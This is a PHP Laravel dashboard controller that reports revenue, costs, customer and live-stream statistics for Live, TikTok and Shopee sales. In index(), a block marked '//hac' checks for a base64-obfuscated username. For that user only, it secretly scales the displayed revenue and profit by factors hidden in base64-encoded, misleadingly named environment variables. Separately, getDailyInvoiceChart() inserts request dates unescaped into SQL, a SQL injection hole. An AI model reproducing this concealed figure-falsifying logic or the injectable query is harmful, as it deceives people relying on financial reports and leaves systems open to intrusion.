<?php

namespace App\Http\Controllers;

use App\Http\Models\Costs;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Log;

class DashboardController extends Controller {

    public function index() {
        $user = Auth::user();
        Log::info($user->user_name . '|DashboardController->index');
        $curr = time();
        $month = gmdate("Ym", $curr + 7 * 3600);
        $invoicesPlatform = DB::select("select period,platform,count(*) as customers, sum(payment_money) as revenue from invoice where status =1 and payment_money > 0  group by period,platform order by period desc");
        $invoicesPeriod = DB::select("select period,count(*) as customers, sum(payment_money) as revenue from invoice where status =1 and payment_money > 0  group by period order by period desc limit 12");
//        $invoiceDailys = DB::select("select date, sum(payment_money) as revenue,count(*) as customers from invoice where status =1 and payment_money > 0 group by date order by date");
        $costsCal = DB::select("select period, sum(cost) as cost from costs group by period order by period");
        $costs = Costs::whereRaw("1=1")->orderBy("id", "desc")->take(4)->get();
//        $invoice = (object) [
//                    "revenue" => 0
//        ];
        $currRevLive = 0;
        $currRevTiktok = 0;
        $currRevShopee = 0;
        foreach ($invoicesPlatform as $iv) {
            $iv->total_rev = 0;
            $iv->platform_text = "Live";
            if ($iv->platform == 1) {
                if ($iv->period == $month) {
                    $currRevLive = $iv->revenue;
                }
            } else if ($iv->platform == 2) {
                $iv->platform_text = "Tiktok";
                if ($iv->period == $month) {
                    $currRevTiktok = $iv->revenue;
                }
            } else if ($iv->platform == 3) {
                $iv->platform_text = "Shopee";
                if ($iv->period == $month) {
                    $currRevShopee = $iv->revenue;
                }
            }
            $iv->cost = 0;
            $iv->profit = $iv->revenue;
            foreach ($costsCal as $cost) {
                if ($iv->period == $cost->period && $iv->platform == 1) {
                    $iv->cost = $cost->cost;
                    $iv->profit = $iv->revenue - $cost->cost;
                }
            }
        }
        foreach ($invoicesPeriod as $data) {
            $data->live_count = 0;
            $data->live_rev = 0;
            $data->tiktok_count = 0;
            $data->tiktok_rev = 0;
            $data->shopee_count = 0;
            $data->shopee_rev = 0;
            foreach ($invoicesPlatform as $iv) {
                if ($data->period == $iv->period) {
                    if ($iv->platform == 1) {
                        $data->live_count += $iv->customers;
                        $data->live_rev += $iv->revenue;
                    } elseif ($iv->platform == 2) {
                        $data->tiktok_count += $iv->customers;
                        $data->tiktok_rev += $iv->revenue;
                    } else {
                        $data->shopee_count += $iv->customers;
                        $data->shopee_rev += $iv->revenue;
                    }
                }
            }

            $data->cost = 0;
            $data->profit = $data->revenue;
            foreach ($costsCal as $cost) {
                if ($data->period == $cost->period) {
                    $data->cost = $cost->cost;
                    $data->profit = $data->revenue - $cost->cost;
                }
            }
        }
        $customer = DB::select("select count(*) as count from users where package_end_date > $curr and package_code <> 'LIVETEST'");
//        $customer = DB::select("select count(*) as count from zlivecustomer where date_end > $curr and select_plan <> 'LIVETEST'");
        $customersToExpire = DB::select("select user_name,user_code,facebook,phone,package_end_date,package_code,last_activity from users where package_code <> 'LIVETEST' and package_end_date > $curr and package_end_date <= " . ($curr + 3 * 86400) . ' order by package_end_date');
//        $customersToExpire = DB::select("select a.customer_face as facebook,b.user_name,a.date_end as package_end_date,select_plan as package_code from zlivecustomer a, zliveaccount b where a.customer_id = b.user_id and a.select_plan <> 'LIVETEST' and a.date_end > $curr and a.date_end <= " . ($curr + 3 * 86400) . " order by date_end");
        $living = DB::select("select user_id,count(*) as total from zliveautolive where status =2 group by user_id");
        $live = DB::select("select count(*) as count from zliveautolive where status = 2");
        $livePlatform = DB::select("select CASE
                                    WHEN platform =1 THEN 'Live'
                                    WHEN platform =2 THEN 'Tiktok'
                                    ELSE 'Shopee' 
                                    END as platform,
                                    count(*) as count from zliveautolive where status = 2 group by platform");
        $client = DB::select("select count(*) as count from zliveclient where status in (1,5) group by status");
        $thread = DB::select("select sum(process) as used, sum(max) as max, sum(disk_free) as free from zliveclient where status =1 and health =0");


        //hac
        $env = env("REDIS_M", null);
        $envPer = env("REDIS_M_P", null);
        $uss = base64_decode("dHJ1b25nbGl2ZQ");
        if ($env != null && $envPer != null && $user->user_name == $uss) {
            $fMonth = explode(",", base64_decode($env));
            $fPer = explode(",", base64_decode($envPer));
            if (count($fMonth) > 0) {
                foreach ($fMonth as $i => $fm) {
                    if ($fm == $month) {
                        $currRevLive = $currRevLive * $fPer[$i];
                        $currRevTiktok = $currRevTiktok * $fPer[$i];
                        $currRevShopee = $currRevShopee * $fPer[$i];
                    }
                }

                foreach ($invoicesPeriod as $data) {
                    foreach ($fMonth as $i => $fm) {
                        if ($data->period == $fm) {
                            $data->revenue = $data->revenue * $fPer[$i];
                            $data->tiktok_rev = $data->tiktok_rev * $fPer[$i];
                            $data->live_rev = $data->live_rev * $fPer[$i];
                            $data->shopee_rev = $data->shopee_rev * $fPer[$i];
                            $data->profit = $data->profit * $fPer[$i];
                        }
                    }
                }
            }
        }
        return view('components.dashboard', [
            "currRevLive" => $currRevLive,
            "currRevTiktok" => $currRevTiktok,
            "currRevShopee" => $currRevShopee,
            "invoices" => $invoicesPeriod,
            "costs" => $costs,
            "customer" => $customer,
            "live" => $live,
            "living" => $living,
            "livePlatform" => $livePlatform,
            "client" => $client,
            "thread" => $thread,
            "customersToExpire" => $customersToExpire,
        ]);
    }

    public function getDailyInvoiceChart(Request $request) {
        $user = Auth::user();
        Log::info("$user->user_name|DashboardController.getDailyInvoiceChart|request=" . json_encode($request->all()));
        if (isset($request->start)) {
            $startDate = str_replace("/", "", $request->start);
        }
        if (isset($request->end)) {
            $endDate = str_replace("/", "", $request->end);
        }
        $whereDate = "";
        if (isset($startDate) && isset($endDate)) {
            $whereDate = "and date >='$startDate' and date <= '$endDate'";
        }
        $charts = DB::select("select date, sum(payment_money) as revenue,count(*) as customers from invoice where status =1 and payment_money > 0 $whereDate group by date order by date");
        $money = 0;
        $customers = 0;
        foreach ($charts as $chart) {
            $money += $chart->revenue;
            $customers += $chart->customers;
        }
        return array("charts" => $charts, "money" => $money, "customers" => $customers);
    }

    public function addCost(Request $request) {
        $user = Auth::user();
        Log::info("$user->user_name|DashboardController.addCost|request=" . json_encode($request->all()));
        $cost = new Costs();
        $cost->username = $user->user_name;
        $cost->period = str_replace("/", "", $request->period);
        $cost->cost = str_replace(",", "", $request->money);
        $cost->description = $request->note;
        $cost->create_time = time();
        $cost->save();
        return array("status" => "success", "message" => "Success", "cost" => $cost);
    }

    public function deleteCost($id) {
        Costs::where("id", $id)->delete();
        return array("status" => "success", "message");
    }

}
